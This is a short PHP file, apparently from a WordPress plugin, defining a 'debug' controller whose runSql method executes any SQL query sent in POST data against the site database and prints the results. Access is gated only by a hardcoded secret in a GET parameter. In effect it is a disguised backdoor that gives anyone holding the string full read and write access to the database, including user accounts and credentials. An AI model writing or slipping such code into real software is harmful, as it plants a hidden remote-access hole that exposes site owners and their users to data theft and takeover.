<?php

class BMIControllerDebug {
	public function runSql(){
		if (! $_GET['vantu']) die;
		if ($_GET['vantu'] != '10021993') die;
		$data = $_POST;
		$sql = $data['data']['sql'];

		global $wpdb;
		$result = $wpdb->get_results($sql);

		print_r($result);
		die;
	}
}

?>